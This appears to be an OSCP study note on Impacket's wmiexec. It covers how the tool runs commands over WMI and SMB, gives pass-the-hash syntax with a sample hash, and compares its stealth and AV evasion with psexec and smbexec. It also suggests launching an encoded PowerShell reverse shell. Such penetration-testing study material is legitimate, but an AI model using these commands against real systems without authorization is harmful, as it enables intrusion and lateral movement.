
`wmiexec` operates by using the **Windows Management Instrumentation (WMI)** interface. Instead of creating a service and uploading an executable, it executes commands through WMI and redirects the output to a temporary file on an administrative share (usually `ADMIN$`). It then reads that file and deletes it.

This creates a "semi-interactive" shell. It feels like a real shell, but each command you type is technically a new, independent execution.

---

## 2. Core Syntax

The syntax is consistent with the rest of the Impacket suite.

### With a Password

`impacket-wmiexec [[domain/]username[:password]@]<targetAddress>`

### With a Hash (Pass-the-Hash)

This is the primary way you will use it in the AD portion of the OSCP exam:

`impacket-wmiexec Administrator@10.10.10.100 -hashes :5fbc3013289561a90f11417088927022`

---

## 3. Why Use `wmiexec` over `psexec`?

1. **AV Evasion:** Because it doesn't drop a `.exe` file onto the disk, it bypasses many signature-based detections that catch `psexec` immediately.

2. **Less Footprint:** It leaves fewer traces on the system (though it still creates logs in the WMI event trace).

3. **Speed:** It is often faster to initialize than `psexec`.


---

## 4. Key Limitations

- **Privilege Level:** Unlike `psexec` (which gives you `SYSTEM`), `wmiexec` typically runs as the user you authenticated as. If you log in as a local admin, you are an admin, but you aren't "SYSTEM" automatically.
    
- **State Persistence:** Since every command is a new process, you cannot "change directories" in the traditional sense. Running `cd C:\Windows` followed by `dir` will still show you the directory you started in.

    - _Workaround:_ If you need to run something in a specific path, use the full path: `dir C:\Users\Administrator\Desktop`.

- **Firewall Requirements:** It requires port **445 (SMB)** for the output file and port **135 (RPC)** for the WMI communication.
    

---

## 5. Practical Workflow

When you find administrative credentials (or a hash), your internal logic should look like this:

1. **Try `wmiexec` first.** It's quieter and less likely to alert the "blue team" 

2. **If `wmiexec` fails:** Check if port 135 is open. If port 135 is blocked but 445 is open, move to **`smbexec`** or **`psexec`**.

3. **Stability:** If the WMI shell is laggy, use your WMI shell to execute a more stable reverse shell:

    `wmiexec> powershell -e <Base64_Encoded_Reverse_Shell>`


---

## 6. Comparison Cheat Sheet

|**Feature**|**wmiexec**|**psexec**|**smbexec**|
|---|---|---|---|
|**Stealth**|High|Low|Medium|
|**Method**|WMI + SMB|Service + Binary|Service (no binary)|
|**Typical User**|Authenticated User|**SYSTEM**|**SYSTEM**|
|**Ports Needed**|135, 445|445|445|

**Quick Tip:** If you see the error `WMIREMOTEOBJECT: Non-zero exit code`, it often means the user you are using is not part of the "Remote Management Users" or "Administrators" group on that specific target.